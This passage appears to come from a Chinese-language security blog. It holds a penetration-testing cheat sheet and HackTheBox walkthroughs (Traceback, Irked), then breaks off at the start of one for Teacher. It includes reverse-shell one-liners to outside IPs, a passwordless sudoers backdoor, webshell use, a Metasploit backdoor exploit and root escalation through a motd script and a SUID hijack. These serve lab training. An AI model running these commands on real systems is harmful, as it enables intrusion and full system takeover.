--wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt id_rsa.hash Hydra 项目地址：https://tools.kali.org/password-attacks/hydra 工具介绍：这款暴力密码破解工具相当强大，支持几乎所有协议的在线密码破解，其密码能否被破解关键在于字典是否足够强大。 详细使用方式：https://www.cnblogs.com/zhaijiahui/p/8371336.html 使用示例： Web登录 GET方式 1hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get &#x2F;admin&#x2F; 1hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get &#x2F;admin&#x2F;index.php Web登录 POST方式 https://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-online-web-form-passwords-with-thc-hydra-burp-suite-0160643/ 数字取证 Steghide 使用手册：http://steghide.sourceforge.net/documentation/manpage.php 常用命令： 隐写： 1$ steghide embed -cf picture.jpg -ef secret.txt 提取： 1$ steghide extract -sf picture.jpg exiftool 项目地址：https://github.com/exiftool/exiftool 使用手册：https://www.jianshu.com/p/d76457799de1 提权脚本 LinEnum 项目地址：https://github.com/rebootuser/LinEnum 使用示例：./LinEnum.sh -s -k keyword -r report -e /tmp/ -t 参数： -k Enter keyword -e Enter export location -t Include thorough (lengthy) tests -s Supply current user password to check sudo perms (INSECURE) -r Enter report name -h Displays this help text Running with no options = limited scans/no output file -e Requires the user enters an output location i.e. /tmp/export. If this location does not exist, it will be created. -r Requires the user to enter a report name. The report (.txt file) will be saved to the current working directory. -t Performs thorough (slow) tests. Without this switch default ‘quick’ scans are performed. -s Use the current user with supplied password to check for sudo permissions - note this is insecure and only really for CTF use! -k An optional switch for which the user can search for a single keyword within many files (documented below). pspy 项目地址：https://github.com/DominicBreuker/pspy 项目介绍：pspy is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. Great for enumeration of Linux systems in CTFs. Also great to demonstrate your colleagues why passing secrets as arguments on the command line is a bad idea. 提权命令 Find World Writable Folders 1find &#x2F; -xdev -type d -perm -0002 -ls 2&gt; &#x2F;dev&#x2F;null Find World Writable Files 1find &#x2F; -xdev -type f -perm -0002 -ls 2&gt; &#x2F;dev&#x2F;null Find SUIDs 1find &#x2F; -perm -4000 -user root -exec ls -ld &#123;&#125; \\; 2&gt; &#x2F;dev&#x2F;null Find SGID 1find &#x2F; -perm -2000 -group root -exec ls -ld &#123;&#125; \\; 2&gt; &#x2F;dev&#x2F;null DIstro Information 1cat &#x2F;etc&#x2F;*-release Check open ports 1netstat -antup Check processes 1ps -elf Process monitoring tool: pspy Useful for monitoring chron jobs or any other scheduled jobs Check processes running with root privileges 1ps -elf | grep root Check running services 1cat &#x2F;etc&#x2F;services Check installed packages 12dpkg -lrpm -qa Check for sudo permissions 1sudo -l Check OS architecture 1uname -a Check cronjobs 1cat &#x2F;etc&#x2F;cron* Check fstab 1cat &#x2F;etc&#x2F;fstab Check network configuration 1ip addr Check contents of /etc/passwd 1cat &#x2F;etc&#x2F;passwd Using socat Listen 1$ socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444 Connect 1$ socat file:&#96;tty&#96;,raw,echo&#x3D;0 tcp-listen:4444 Reverse connection using mknod 1mknod &#x2F;tmp&#x2F;backpipe p; &#x2F;bin&#x2F;sh 0&lt; &#x2F;tmp&#x2F;backpipe | nc &lt;ip&gt; &lt;port&gt; 1&gt; &#x2F;tmp&#x2F;backpipe; rm &#x2F;tmp&#x2F;backpipe Check version of an installed application 1dpkg -l &lt;application name&gt; Sometimes checking /opt /tmp /var /usr might help. Edit sudoers file and grant sudo access to the current user (www-data in this case) with no password 1echo &quot;www-data ALL&#x3D;NOPASSWD: ALL&quot; &gt;&gt; &#x2F;etc&#x2F;sudoers &amp;&amp; chmod 440 &#x2F;etc&#x2F;sudoers Reverse Shell http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet 常用工具 SQLMAP https://zerokeeper.com/web-security/sqlmap-usage-summary.html# https://louisnie.github.io/2019/03/03/SQLMAP/","tags":[{"name":"Linux Enumeration","slug":"Linux-Enumeration","permalink":"http://ca0y1h.top/tags/Linux-Enumeration/"}],"categories":[{"name":"技术随笔","slug":"技术随笔","permalink":"http://ca0y1h.top/categories/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/"}]},{"title":"HTB::Traceback Walkthrough","date":"2020-03-24T14:08:57.000Z","path":"Target_drone/HackTheBox/10.HTB-Traceback-walkthrough/","text":"HTB::Traceback Walkthrough 0x01 Info Card 0x02 Tools and Tips nmap pspy gtfobins OSINT SSH with public key 0x03 Pentesting Initial Enumeration nmap scan 1234567891011121314151617# Nmap 7.80 scan initiated Mon Mar 23 10:20:21 2020 as: nmap -sC -sV -oN ippsec_scan.txt 10.10.10.181Nmap scan report for 10.10.10.181Host is up (0.37s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)| 256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)|_ 256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)80&#x2F;tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)|_http-title: Help usService Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernelService detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .# Nmap done at Mon Mar 23 10:21:10 2020 -- 1 IP address (1 host up) scanned in 49.24 seconds Meanwhile, I ran gobuster and dirb But there is anything interesting for me. Getting User Access 80 HTTP Website Hint：Some of the best web shells that you might need ;)， Google it Found a Github repo Test all webshell filename for url smevk.php webshell works, and username is admin, password is admin. Upload php reverse shell script through Code Injector module. Now I can get a php reverse shell 123456789101112131415161718192021$ nc -lvvp 4444listening on [any] 4444 ...10.10.10.181: inverse host lookup failed: Unknown hostconnect to [10.10.16.99] from (UNKNOWN) [10.10.10.181] 33430&#x2F;bin&#x2F;sh: 0: can&#39;t access tty; job control turned off$ iduid&#x3D;1000(webadmin) gid&#x3D;1000(webadmin) groups&#x3D;1000(webadmin),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)$ cd &#x2F;home&#x2F;webadmin$ ls -latotal 44drwxr-x--- 5 webadmin sysadmin 4096 Mar 16 04:03 .drwxr-xr-x 4 root root 4096 Aug 25 2019 ..-rw------- 1 webadmin webadmin 105 Mar 16 04:03 .bash_history-rw-r--r-- 1 webadmin webadmin 220 Aug 23 2019 .bash_logout-rw-r--r-- 1 webadmin webadmin 3771 Aug 23 2019 .bashrcdrwx------ 2 webadmin webadmin 4096 Aug 23 2019 .cachedrwxrwxr-x 3 webadmin webadmin 4096 Aug 24 2019 .local-rw-rw-r-- 1 webadmin webadmin 1 Aug 25 2019 .luvit_history-rw-r--r-- 1 webadmin webadmin 807 Aug 23 2019 .profiledrwxrwxr-x 2 webadmin webadmin 4096 Feb 27 06:29 .ssh-rw-rw-r-- 1 sysadmin sysadmin 122 Mar 16 03:53 note.txt 在webadmin的主目录主要看两个文件note.txt和.bash_history 123456789101112$ cat note.txt- sysadmin -I have left a tool to practice Lua.I&#39;m sure you know where to find it.Contact me if you have any question.$ cat .bash_historyls -lasudo -lnano privesc.luasudo -u sysadmin &#x2F;home&#x2F;sysadmin&#x2F;luvit privesc.lua rm privesc.lualogout 应该是利用/home/sysadmin/luvit这个工具执行lua脚本，可以再新建一个privesc.lua脚本，然后模仿.bash_history执行命令 123456789101112$ echo &#39;os.execute(&quot;&#x2F;bin&#x2F;sh&quot;)&#39; &gt; privesc.lua$ cat privesc.luaos.execute(&quot;&#x2F;bin&#x2F;sh&quot;)$sudo -u sysadmin &#x2F;home&#x2F;sysadmin&#x2F;luvit privesc.luash: turning off NDELAY mode$ iduid&#x3D;1001(sysadmin) gid&#x3D;1001(sysadmin) groups&#x3D;1001(sysadmin)cd &#x2F;home&#x2F;sysadmin lsluvituser.txt Get user flag~ Getting Root Access 看了一下HTB Forum上面一些师傅给的提示，用pspy工具监视系统中在执行的程序，发现了一个有意思的地方： 123456789101112132020&#x2F;03&#x2F;23 21:11:01 CMD: UID&#x3D;0 PID&#x3D;2273 | sleep 30 2020&#x2F;03&#x2F;23 21:11:01 CMD: UID&#x3D;0 PID&#x3D;2272 | &#x2F;bin&#x2F;sh -c sleep 30 ; &#x2F;bin&#x2F;cp &#x2F;var&#x2F;backups&#x2F;.update-motd.d&#x2F;* &#x2F;etc&#x2F;update-motd.d&#x2F; 2020&#x2F;03&#x2F;23 21:11:01 CMD: UID&#x3D;0 PID&#x3D;2271 | 2020&#x2F;03&#x2F;23 21:11:01 CMD: UID&#x3D;0 PID&#x3D;2270 | &#x2F;usr&#x2F;sbin&#x2F;CRON -f 2020&#x2F;03&#x2F;23 21:11:01 CMD: UID&#x3D;0 PID&#x3D;2269 | &#x2F;usr&#x2F;sbin&#x2F;CRON -f 2020&#x2F;03&#x2F;23 21:11:31 CMD: UID&#x3D;0 PID&#x3D;2275 | &#x2F;bin&#x2F;cp &#x2F;var&#x2F;backups&#x2F;.update-motd.d&#x2F;00-header &#x2F;var&#x2F;backups&#x2F;.update-motd.d&#x2F;10-help-text &#x2F;var&#x2F;backups&#x2F;.update-motd.d&#x2F;50-motd-news &#x2F;var&#x2F;backups&#x2F;.update-motd.d&#x2F;80-esm &#x2F;var&#x2F;backups&#x2F;.update-motd.d&#x2F;91-release-upgrade &#x2F;etc&#x2F;update-motd.d&#x2F; 2020&#x2F;03&#x2F;23 21:12:02 CMD: UID&#x3D;0 PID&#x3D;2281 | sleep 30 2020&#x2F;03&#x2F;23 21:12:02 CMD: UID&#x3D;0 PID&#x3D;2278 | &#x2F;bin&#x2F;sh -c sleep 30 ; &#x2F;bin&#x2F;cp &#x2F;var&#x2F;backups&#x2F;.update-motd.d&#x2F;* &#x2F;etc&#x2F;update-motd.d&#x2F; 2020&#x2F;03&#x2F;23 21:12:02 CMD: UID&#x3D;0 PID&#x3D;2277 | 2020&#x2F;03&#x2F;23 21:12:02 CMD: UID&#x3D;0 PID&#x3D;2276 | &#x2F;usr&#x2F;sbin&#x2F;CRON -f 2020&#x2F;03&#x2F;23 21:12:32 CMD: UID&#x3D;0 PID&#x3D;2282 | &#x2F;bin&#x2F;cp &#x2F;var&#x2F;backups&#x2F;.update-motd.d&#x2F;00-header &#x2F;var&#x2F;backups&#x2F;.update-motd.d&#x2F;10-help-text &#x2F;var&#x2F;backups&#x2F;.update-motd.d&#x2F;50-motd-news &#x2F;var&#x2F;backups&#x2F;.update-motd.d&#x2F;80-esm &#x2F;var&#x2F;backups&#x2F;.update-motd.d&#x2F;91-release-upgrade &#x2F;etc&#x2F;update-motd.d&#x2F; 可以看到系统每隔30秒就把/var/backups/.update-motd.d/中的文件都复制到/etc/update-motd.d/，Google一下update-motd.d的作用，发现是每次SSH登录成功后，会执行00-header文件中的命令。现在的问题就是怎么用SSH登录靶机，我找了很久SSH的登录密码，后来才突然想到SSH除了口令登录还可以公钥登录，把本机上的公钥拷贝到靶机的/home/webadmin/.ssh/authorized_keys文件中即可。 顺便把SSH的原理复习一下：https://www.jianshu.com/p/33461b619d53 靶机 123456$ echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC6zGx1XQHjBj5x5D+qqE+0wml2VnALfbz7D5CpexgNrpEDQTOWCEkIAl1Ftt9FNClzdNk+&#x2F;NFMWXR8dxRHzOl7aQzMa+njQOzh6VyM34YbCGuGgakDCIrsHu25dAwypvJ7Clp22faDDIw6zJxcx84Ir1XSpUeWZ4Cotk+0gVzwgLHbstRPxyzxROvcsesx9kd251L3&#x2F;bWJzC53oNDaSXzMBYV7sdjSlPLeD9zHJ39wr5YaEFwn0vkgPR+VAdlXAOLi98Ttr+FYMsGr8XMbJU06QKZ2ozf6RVjc6RJ5hjgIFbcxV8VCNGM6rBx5FDCZDgnbzu4ITWpWsgBBLu3JndjD+UWkeejLE4K7eR3510W&#x2F;x4zHF&#x2F;0TsZicyh&#x2F;ZJbZEo+JefvVKT0WAilaJ2K7w7jDkrPhZO6TheGTDnvLqrEvHObGq70ytpZ6ippsm78&#x2F;xkwCHu4l03RMd2Zt+7elXOsA&#x2F;4WsjEvS+CxqlbtTC636+T6T4cTro2GHlO3lAq7oddq0&#x3D; kali@kali &gt;&gt; &#x2F;home&#x2F;webadmin&#x2F;.ssh&#x2F;authorized_keys$ cd &#x2F;etc&#x2F;update-motd.d&#x2F;$ echo &quot;cat &#x2F;root&#x2F;root.txt&quot; &gt;&gt; 00-header 主机（这两个步骤衔接要快） 12345678910$ ssh -i id_rsa webadmin@10.10.10.181#################################-------- OWNED BY XH4H ---------- I guess stuff could have been configured better ^^ -#################################Welcome to Xh4H landcf6c[---------------------------]aefcLast login: Mon Mar 16 03:50:24 2020 from 10.10.14.2 Get root flag~ 另外，还可以在91-release-upgrade写一个reverse shell： 123456789#!&#x2F;bin&#x2F;sh&#x2F;tmp&#x2F;nc -e &#x2F;bin&#x2F;bash 10.10.14.194 2345# if the current release is under development there won&#39;t be a new oneif [ &quot;$(lsb_release -sd | cut -d&#39; &#39; -f4)&quot; &#x3D; &quot;(development&quot; ]; then exit 0fiif [ -x &#x2F;usr&#x2F;lib&#x2F;ubuntu-release-upgrader&#x2F;release-upgrade-motd ]; then exec &#x2F;usr&#x2F;lib&#x2F;ubuntu-release-upgrader&#x2F;release-upgrade-motdfi 0x04 Conclusion 0x05 Reference https://www.hackingarticles.in/fowsniff-1-vulnhub-walkthrough/ https://github.com/DominicBreuker/pspy https://gtfobins.github.io/gtfobins/lua/","tags":[{"name":"靶机","slug":"靶机","permalink":"http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"}],"categories":[{"name":"靶机","slug":"靶机","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"},{"name":"HTB","slug":"靶机/HTB","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/HTB/"}]},{"title":"HTB::Irked Walkthrough","date":"2020-03-24T14:08:38.000Z","path":"Target_drone/HackTheBox/9.HTB-Irked-walkthrough/","text":"HTB::Irked Walkthrough 0x01 Info Card 0x02 Tools and Tips nmap steghide metaspolit 0x03 Pentesting Initial Enumeration nmap scan ports 123456789101112131415161718192021222324252627282930313233$ nmap -sC -sV -p- 10.10.10.117 Nmap scan report for 10.10.10.117Host is up (0.23s latency).Not shown: 65528 filtered portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)| ssh-hostkey: | 1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)| 2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)| 256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)|_ 256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)80&#x2F;tcp open http Apache httpd 2.4.10 ((Debian))|_http-server-header: Apache&#x2F;2.4.10 (Debian)|_http-title: Site doesn&#39;t have a title (text&#x2F;html).111&#x2F;tcp open rpcbind 2-4 (RPC #100000)| rpcinfo: | program version port&#x2F;proto service| 100000 2,3,4 111&#x2F;tcp rpcbind| 100000 2,3,4 111&#x2F;udp rpcbind| 100000 3,4 111&#x2F;tcp6 rpcbind| 100000 3,4 111&#x2F;udp6 rpcbind| 100024 1 39065&#x2F;tcp6 status| 100024 1 47673&#x2F;udp status| 100024 1 49431&#x2F;tcp status|_ 100024 1 56811&#x2F;udp6 status6697&#x2F;tcp open irc UnrealIRCd8067&#x2F;tcp open irc UnrealIRCd49431&#x2F;tcp open status 1 (RPC #100024)65534&#x2F;tcp open irc UnrealIRCdService Info: Host: irked.htb; OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernelService detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .Nmap done: 1 IP address (1 host up) scanned in 1762.08 seconds website home page Getting User Access search UnrealIRCd through msf 123456789101112131415161718192021222324252627282930313233343536373839404142434445msf5 &gt; search UnrealIRCdMatching Modules&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit&#x2F;unix&#x2F;irc&#x2F;unreal_ircd_3281_backdoor 2010-06-12 excellent No UnrealIRCD 3.2.8.1 Backdoor Command Execution msf5 &gt; use exploit&#x2F;unix&#x2F;irc&#x2F;unreal_ircd_3281_backdoormsf5 exploit(unix&#x2F;irc&#x2F;unreal_ircd_3281_backdoor) &gt; show optionsModule options (exploit&#x2F;unix&#x2F;irc&#x2F;unreal_ircd_3281_backdoor): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39; RPORT 6667 yes The target port (TCP)Exploit target: Id Name -- ---- 0 Automatic Targetmsf5 exploit(unix&#x2F;irc&#x2F;unreal_ircd_3281_backdoor) &gt; set RHOSTS 10.10.10.117RHOSTS &#x3D;&gt; 10.10.10.117msf5 exploit(unix&#x2F;irc&#x2F;unreal_ircd_3281_backdoor) &gt; set RPORT 6697RPORT &#x3D;&gt; 6697msf5 exploit(unix&#x2F;irc&#x2F;unreal_ircd_3281_backdoor) &gt; exploit [*] Started reverse TCP double handler on 10.10.16.99:4444 [*] 10.10.10.117:6697 - Connected to 10.10.10.117:6697... :irked.htb NOTICE AUTH :*** Looking up your hostname...[*] 10.10.10.117:6697 - Sending backdoor command...[*] Accepted the first client connection...[*] Accepted the second client connection...[*] Command: echo XSY6AWtTV0SElhyO;[*] Writing to socket A[*] Writing to socket B[*] Reading from sockets...[*] Reading from socket A[*] A: &quot;XSY6AWtTV0SElhyO\\r\\n&quot;[*] Matching...[*] B is input...[*] Command shell session 1 opened (10.10.16.99:4444 -&gt; 10.10.10.117:36674) at 2020-03-23 04:21:50 -0400 python tty shell 12345678910111213python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;ircd@irked:~&#x2F;Unreal3.2$ ididuid&#x3D;1001(ircd) gid&#x3D;1001(ircd) groups&#x3D;1001(ircd)ircd@irked:~$ ls -lals -latotal 20drwxr-xr-x 3 ircd root 4096 May 15 2018 .drwxr-xr-x 4 root root 4096 May 14 2018 ..-rw------- 1 ircd ircd 333 May 15 2018 .bash_history-rw-r--r-- 1 ircd ircd 0 May 14 2018 .bashrc-rw-r--r-- 1 ircd ircd 66 May 14 2018 .selected_editordrwx------ 13 ircd ircd 4096 Mar 22 18:37 Unreal3.2 exeamine histroy command .bash_history 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849ircd@irked:~$ cat .bash_historycat .bash_historylscat aliasesls keysls keysls keys&#x2F;CVScd keyslsfile CVScd CVSlsls Rootcat Root&#x2F;Rootcd Rootlsfile Rootcat Rootcd &#x2F;lscd &#x2F;homelscd djmardovlsls *cd &#x2F;tmplsclearclearlscd &#x2F;lscd &#x2F;var&#x2F;www&#x2F;htmllscd &#x2F;tmpsudo -icd &#x2F;home&#x2F;ircdclearlsls -lahcd ..lscd djmardovlscd Documentsls -lahcat .backupclearexit Sensitive file /home/djmardov/Documents/.backup 1234ircd@irked:&#x2F;home&#x2F;djmardov&#x2F;Documents$ cat .backupcat .backupSuper elite steg backup pwUPupDOWNdownLRlrBAbaSSss Down the image 1$ wget http:&#x2F;&#x2F;10.10.10.117&#x2F;irked.jpg steghide extract file from the image 12345$ steghide extract -sf irked.jpgEnter passphrase: wrote extracted data to &quot;pass.txt&quot;.$ cat pass.txtKab6h+m+bbp2J:HG SSH port 22 123456789101112131415161718$ ssh djmardov@10.10.10.117The authenticity of host &#39;10.10.10.117 (10.10.10.117)&#39; can&#39;t be established.ECDSA key fingerprint is SHA256:kunqU6QEf9TV3pbsZKznVcntLklRwiVobFZiJguYs4g.Are you sure you want to continue connecting (yes&#x2F;no&#x2F;[fingerprint])? yesWarning: Permanently added &#39;10.10.10.117&#39; (ECDSA) to the list of known hosts.djmardov@10.10.10.117&#39;s password: The programs included with the Debian GNU&#x2F;Linux system are free software;the exact distribution terms for each program are described in theindividual files in &#x2F;usr&#x2F;share&#x2F;doc&#x2F;*&#x2F;copyright.Debian GNU&#x2F;Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Tue May 15 08:56:32 2018 from 10.33.3.3djmardov@irked:~$ iduid&#x3D;1000(djmardov) gid&#x3D;1000(djmardov) groups&#x3D;1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)djmardov@irked:~$ cat ~&#x2F;Documents&#x2F;user.txt 4a66a78b12dc0e661a59d3f5c0267a8e Getting Root Access Find SUID directory 1234567891011121314151617181920212223djmardov@irked:~$ find &#x2F; -perm -4000 -user root -exec ls -ld &#123;&#125; \\; 2&gt;&#x2F;dev&#x2F;null;-rwsr-xr-- 1 root messagebus 362672 Nov 21 2016 &#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper-rwsr-xr-x 1 root root 9468 Mar 28 2017 &#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device-rwsr-xr-x 1 root root 13816 Sep 8 2016 &#x2F;usr&#x2F;lib&#x2F;policykit-1&#x2F;polkit-agent-helper-1-rwsr-xr-x 1 root root 562536 Nov 19 2017 &#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign-rwsr-xr-x 1 root root 13564 Oct 14 2014 &#x2F;usr&#x2F;lib&#x2F;spice-gtk&#x2F;spice-client-glib-usb-acl-helper-rwsr-xr-x 1 root root 1085300 Feb 10 2018 &#x2F;usr&#x2F;sbin&#x2F;exim4-rwsr-xr-- 1 root dip 338948 Apr 14 2015 &#x2F;usr&#x2F;sbin&#x2F;pppd-rwsr-xr-x 1 root root 43576 May 17 2017 &#x2F;usr&#x2F;bin&#x2F;chsh-rwsr-sr-x 1 root mail 96192 Nov 18 2017 &#x2F;usr&#x2F;bin&#x2F;procmail-rwsr-xr-x 1 root root 78072 May 17 2017 &#x2F;usr&#x2F;bin&#x2F;gpasswd-rwsr-xr-x 1 root root 38740 May 17 2017 &#x2F;usr&#x2F;bin&#x2F;newgrp-rwsr-xr-x 1 root root 18072 Sep 8 2016 &#x2F;usr&#x2F;bin&#x2F;pkexec-rwsr-sr-x 1 root root 9468 Apr 1 2014 &#x2F;usr&#x2F;bin&#x2F;X-rwsr-xr-x 1 root root 53112 May 17 2017 &#x2F;usr&#x2F;bin&#x2F;passwd-rwsr-xr-x 1 root root 52344 May 17 2017 &#x2F;usr&#x2F;bin&#x2F;chfn-rwsr-xr-x 1 root root 7328 May 16 2018 &#x2F;usr&#x2F;bin&#x2F;viewuser-rwsr-xr-x 1 root root 96760 Aug 13 2014 &#x2F;sbin&#x2F;mount.nfs-rwsr-xr-x 1 root root 38868 May 17 2017 &#x2F;bin&#x2F;su-rwsr-xr-x 1 root root 34684 Mar 29 2015 &#x2F;bin&#x2F;mount-rwsr-xr-x 1 root root 34208 Jan 21 2016 &#x2F;bin&#x2F;fusermount-rwsr-xr-x 1 root root 161584 Jan 28 2017 &#x2F;bin&#x2F;ntfs-3g-rwsr-xr-x 1 root root 26344 Mar 29 2015 &#x2F;bin&#x2F;umount Inspect the viewuser binary 123456djmardov@irked:~$ &#x2F;usr&#x2F;bin&#x2F;viewuserThis application is being devleoped to set and test user permissionsIt is still being actively developed(unknown) :0 2020-03-22 18:37 (:0)djmardov pts&#x2F;1 2020-03-23 09:52 (10.10.16.99)sh: 1: &#x2F;tmp&#x2F;listusers: not found viewuser似乎尝试执行/tmp中名为listuser的不存在的脚本，向脚本中写入bash命令 1234567891011121314151617djmardov@irked:&#x2F;tmp$ touch listusersdjmardov@irked:&#x2F;tmp$ echo &#39;#!&#x2F;bin&#x2F;bash&#39; &gt;&gt; listusers djmardov@irked:&#x2F;tmp$ echo &#39;&#x2F;bin&#x2F;sh&#39; &gt;&gt; listusers djmardov@irked:&#x2F;tmp$ &#x2F;usr&#x2F;bin&#x2F;viewuser This application is being devleoped to set and test user permissionsIt is still being actively developed(unknown) :0 2020-03-22 18:37 (:0)djmardov pts&#x2F;1 2020-03-23 09:52 (10.10.16.99)sh: 1: &#x2F;tmp&#x2F;listusers: Permission denieddjmardov@irked:&#x2F;tmp$ chmod 777 listusers djmardov@irked:&#x2F;tmp$ &#x2F;usr&#x2F;bin&#x2F;viewuser This application is being devleoped to set and test user permissionsIt is still being actively developed(unknown) :0 2020-03-22 18:37 (:0)djmardov pts&#x2F;1 2020-03-23 09:52 (10.10.16.99)# iduid&#x3D;0(root) gid&#x3D;1000(djmardov) groups&#x3D;1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth) 0x04 Conclusion","tags":[{"name":"靶机","slug":"靶机","permalink":"http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"}],"categories":[{"name":"靶机","slug":"靶机","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"},{"name":"HTB","slug":"靶机/HTB","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/HTB/"}]},{"title":"HTB::Teacher Walkthrough","date":"2020-03-24T14:08:26.000Z","path":"Target_drone/HackTheBox/8.HTB-Teacher-walkthrough/","text":"HTB::Teacher Walkthrough 0x01 Info Card 0x02 Tools and Tips nmap nikto dirb dirsearch hydra hash-identifier Moodle 3.4.1 - Remote Code Execute 0x03 Pentesting Initial Enumeration nmap扫描靶机TCP端口 1234567891011121314151617181920212223242526272829303132333435λ nmap -sV -A -Pn -T4 10.10.10.153Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-03-22 13:08 ?D1ú±ê×?ê±??Stats: 0:00:12 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth ScanSYN Stealth Scan Timing: About 56.13% done; ETC: 13:08 (0:00:04 remaining)Stats: 0:00:35 elapsed; 0 hosts completed (1 up), 1 undergoing TracerouteTraceroute Timing: About 32.26% done; ETC: 13:08 (0:00:00 remaining)Nmap scan report for 10.10.10.153Host is up (0.23s latency).Not shown: 999 closed portsPORT STATE SERVICE VERSION80&#x2F;tcp open http Apache httpd 2.4.25 ((Debian))|_http-server-header: Apache&#x2F;2.4.25 (Debian)|_http-title: Blackhat highschoolNo exact OS matches for host (If you know what OS is running on it, see https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; ).TCP&#x2F;IP fingerprint:OS:SCAN(V&#x3D;7.80%E&#x3D;4%D&#x3D;3&#x2F;22%OT&#x3D;80%CT&#x3D;1%CU&#x3D;39891%PV&#x3D;Y%DS&#x3D;2%DC&#x3D;T%G&#x3D;Y%TM&#x3D;5E76F2EOS:3%P&#x3D;i686-pc-windows-windows)SEQ(SP&#x3D;104%GCD&#x3D;1%ISR&#x3D;10A%TI&#x3D;Z%CI&#x3D;I%II&#x3D;I%TS&#x3D;8OS:)SEQ(CI&#x3D;I%II&#x3D;I)OPS(O1&#x3D;M54DST11NW7%O2&#x3D;M54DST11NW7%O3&#x3D;M54DNNT11NW7%O4&#x3D;M54DOS:ST11NW7%O5&#x3D;M54DST11NW7%O6&#x3D;M54DST11)WIN(W1&#x3D;7120%W2&#x3D;7120%W3&#x3D;7120%W4&#x3D;7120%WOS:5&#x3D;7120%W6&#x3D;7120)ECN(R&#x3D;Y%DF&#x3D;Y%T&#x3D;40%W&#x3D;7210%O&#x3D;M54DNNSNW7%CC&#x3D;Y%Q&#x3D;)T1(R&#x3D;Y%DF&#x3D;YOS:%T&#x3D;40%S&#x3D;O%A&#x3D;S+%F&#x3D;AS%RD&#x3D;0%Q&#x3D;)T2(R&#x3D;N)T3(R&#x3D;N)T4(R&#x3D;Y%DF&#x3D;Y%T&#x3D;40%W&#x3D;0%S&#x3D;A%A&#x3D;Z%FOS:&#x3D;R%O&#x3D;%RD&#x3D;0%Q&#x3D;)T5(R&#x3D;Y%DF&#x3D;Y%T&#x3D;40%W&#x3D;0%S&#x3D;Z%A&#x3D;S+%F&#x3D;AR%O&#x3D;%RD&#x3D;0%Q&#x3D;)T6(R&#x3D;Y%DF&#x3D;Y%OS:T&#x3D;40%W&#x3D;0%S&#x3D;A%A&#x3D;Z%F&#x3D;R%O&#x3D;%RD&#x3D;0%Q&#x3D;)T7(R&#x3D;Y%DF&#x3D;Y%T&#x3D;40%W&#x3D;0%S&#x3D;Z%A&#x3D;S+%F&#x3D;AR%O&#x3D;%RDOS:&#x3D;0%Q&#x3D;)U1(R&#x3D;Y%DF&#x3D;N%T&#x3D;40%IPL&#x3D;164%UN&#x3D;0%RIPL&#x3D;G%RID&#x3D;G%RIPCK&#x3D;G%RUCK&#x3D;G%RUD&#x3D;G)IEOS:(R&#x3D;Y%DFI&#x3D;N%T&#x3D;40%CD&#x3D;S)Network Distance: 2 hopsTRACEROUTE (using port 110&#x2F;tcp)HOP RTT ADDRESS1 230.00 ms 10.10.14.12 232.00 ms 10.10.10.153OS and Service detection performed. Please report any incorrect results at 